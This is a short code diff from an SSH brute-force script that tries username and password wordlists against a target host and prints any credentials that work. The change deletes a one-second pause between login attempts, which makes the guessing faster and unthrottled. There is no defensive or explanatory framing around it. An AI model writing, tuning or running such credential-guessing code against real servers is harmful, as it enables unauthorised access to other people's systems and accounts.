@@ -42,7 +42,6 @@ def ssh_bruteforce(target_ip, target_port, username_wordlist, password_wordlist)
             try:
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                time.sleep(1)
                 client.connect(hostname=target_ip, port=target_port, username=username, password=password, timeout=1, allow_agent=False, look_for_keys=False)
                 print(f"\033[93mSuccess! Username: {username}, Password: {password}\033[0m")
                 return username, password
